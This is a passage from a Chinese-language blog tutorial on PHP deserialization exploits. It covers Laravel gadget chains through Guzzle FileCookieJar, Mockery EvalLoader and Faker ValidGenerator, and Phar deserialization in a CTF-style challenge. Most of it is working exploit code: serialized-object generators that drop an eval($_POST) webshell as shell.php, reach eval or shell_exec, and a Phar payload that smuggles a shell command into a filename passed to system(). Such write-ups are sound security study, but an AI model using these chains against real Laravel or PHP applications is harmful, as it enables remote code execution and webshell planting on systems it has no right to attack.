punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpOption<span class="token punctuation">\</span>LazyOption</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php eval(\$_POST['Dig2'])?>"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Validation<span class="token punctuation">\</span>Validator</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//'select'不重要，只要option中存在就可以了</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'not important'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="链三（8-5-9）"><a href="#链三（8-5-9）" class="headerlink" title="链三（8.5.9）"></a>链三（8.5.9）</h3><p>入口类为<code>\vendor\guzzlehttp\guzzle\src\Cookie\FileCookieJar.php</code>的<code>class FileCookieJar</code>。此类在Laravel 5中没有出现。其有<code>__destruct</code>函数：</p><p><img src="https://pic1.zhimg.com/80/v2-8c5bfef583624d2186b449ec04ff6190_720w.jpg" alt="img"></p><p><code>$this-&gt;filename</code>可控，跟踪save函数：</p><p>$cookie是SetCookie类的对象</p><p><img src="https://pic1.zhimg.com/80/v2-7be40fcebbe7eea13565cc29a3649fe4_720w.jpg" alt="img"></p><p>有file_put_contents函数。一路顺下去，能看到该类的接口是实现了IteratorAggregate的，如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">interface CookieJarInterface extends \Countable, \IteratorAggregate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也就是说它实现了自己的<code>foreach ($this as $cookie)</code>方法，这里同样用composer安装一下该组件再进行获取序列化字符串比较方便。<strong>因为我们要通过其父类的SetCookie方法来设置这里的<code>$cookie</code>值</strong>。其余没有什么值得注意的地方，比较简单，payload如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 3.php</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">require</span> <span class="token string double-quoted-string">"./vendor/autoload.php"</span><span class="token punctuation">;</span><span class="token comment">#composer install安装之后直接使用源码中的类，不用再自己写</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>GuzzleHttp<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>FileCookieJar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># $this->filename=$cookieFile="shell.php"</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>GuzzleHttp<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>SetCookie</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token comment">//父类CookieJar的setCookie方法可以设置，子类中SetCookie类的对象$cookie</span>        <span class="token string single-quoted-string">'Name'</span><span class="token operator">=></span><span class="token string single-quoted-string">'123'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'Domain'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"&lt;?php eval(\$_POST['Dig2']) ?>"</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'Expires'</span><span class="token operator">=></span><span class="token number">123</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'Value'</span><span class="token operator">=></span><span class="token number">123</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="链四（8-5-9）"><a href="#链四（8-5-9）" class="headerlink" title="链四（8.5.9）"></a>链四（8.5.9）</h3><p>由于链一中的call_user_func()无法调用eval.所以在链一的基础上进一步利用寻找反序列化链</p><p>eval执行</p><p>到这里已经可以调用任意类的任意方法了，但是call_user_func无法执行eval函数，如果我们的system被ban了的话，就需要继续寻找执行任意命令的函数，我们找到laravel5.8\vendor\mockery\mockery\library\Mockery\Loader\EvalLoader.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span> <span class="token keyword">implements</span> <span class="token class-name">Loader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token class-name type-declaration">MockDefinition</span> <span class="token variable">$definition</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$definition</span><span class="token operator">-></span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"?>"</span> <span class="token operator">.</span> <span class="token variable">$definition</span><span class="token operator">-></span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个eval函数，这里需要绕过eval上面的if语句，否则直接就return了</p><p>$definition变量是MockDefinition类，跟进一下class MockDefinition</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token operator">...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里$code，$config可控，但是呢$definition-&gt;getClassName()需要一个不存在的类，我们找一个类其getName是可控的，然后构造一个不存在的类即可，如下</p><p>laravel5.8\vendor\mockery\mockery\library\Mockery\Generator\MockConfiguration.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">MockConfiguration</span><span class="token punctuation">&#123;</span>    <span class="token operator">...</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后exp如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span><span class="token operator">=</span><span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BroadcastEvent</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span><span class="token operator">=</span><span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span>    <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">=</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockConfiguration</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$mockConfiguration</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockConfiguration</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mockDefinition</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$mockConfiguration</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" &lt;?php phpinfo();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dispatcher</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"load"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$broadcastEvent</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>BroadcastEvent</span><span class="token punctuation">(</span><span class="token variable">$mockDefinition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingBroadcast</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$dispatcher</span><span class="token punctuation">,</span><span class="token variable">$broadcastEvent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingBroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="从0开始挖链子"><a href="#从0开始挖链子" class="headerlink" title="从0开始挖链子"></a>从0开始挖链子</h3><p>全局搜索function __destruct()</p><p>寻找每个函数中，是否有可利用的点（自定义函数，变量可控）</p><p>只要有<code>$this-&gt;a</code>等样子，参数一般都是可控的</p><p>注意命名空间和url编码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php    namespace Faker&#123;        class ValidGenerator        &#123;            protected $generator;            protected $validator;            protected $maxRetries;            public function __construct($generator)            &#123;                $this-&gt;generator&#x3D;$generator;                $this-&gt;validator&#x3D;&#39;shell_exec&#39;;                $this-&gt;maxRetries&#x3D;1;            &#125;        &#125;        class DefaultGenerator        &#123;            protected $default;            public function __construct()            &#123;                $this-&gt;default&#x3D;&#39;calc&#39;;            &#125;        &#125;    &#125;    namespace Illuminate\Broadcasting &#123;        class PendingBroadcast        &#123;            protected $events;            protected $event;            public function __construct($events)            &#123;                $this-&gt;event&#x3D;&#39;binbin&#39;;                $this-&gt;events&#x3D;$events;            &#125;        &#125;    &#125;    namespace&#123;        $d&#x3D;new Faker\DefaultGenerator();        $v&#x3D;new Faker\ValidGenerator($d);        $p&#x3D;new Illuminate\Broadcasting\PendingBroadcast($v);        echo urlencode(serialize($p));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><p>phar文件类似于java的jar包</p><p>生成了一个phar文件之后 flag.phar</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.phar"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"phar:///flag.phar"</span><span class="token punctuation">;</span><span class="token comment">#三种都可以成功包含</span><span class="token comment">#但是当phar中有类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>凡是包含了phar_parse_metadata的函数都可以对metada进行反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先phar反序列化的危险函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#有大牛曾经总结过，所有文件操作的函数都可以触发这种序列化：</span>fileatime filectime filemtimestatfileinodefileowner filegroupfilepermsfile file_get_contents readfile fopenfile_exists is_dir is_executable is_file is_link is_readable is_writeable is_writableparse_ini_fileunlinkcopy还有大牛深入的分析过这些函数的原理，并且加以扩展：exif_thumbnailexif_imagetypeimageloadfontimagecreatefromhash_hmac_filehash_filehash_update_filemd5_filesha1_fileget_meta_tagsget_headersgetimagesizegetimagesizefromstringhightlight_file几乎所有和<span class="token constant">IO</span>有关的函数都涉及到了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一旦遇到感觉想要两次不同的访问同时进行时才能成功的都可以尝试<strong>竞争</strong></p><p>除此之外，本体还可以传入在file_get_contents绝对路径路径，这样后面的unlink函数由于前面又凭借路径。导致删除失败，于是phar文件没有被删除</p><p>phar反序列化文件格式：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"1;tac fla*"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token 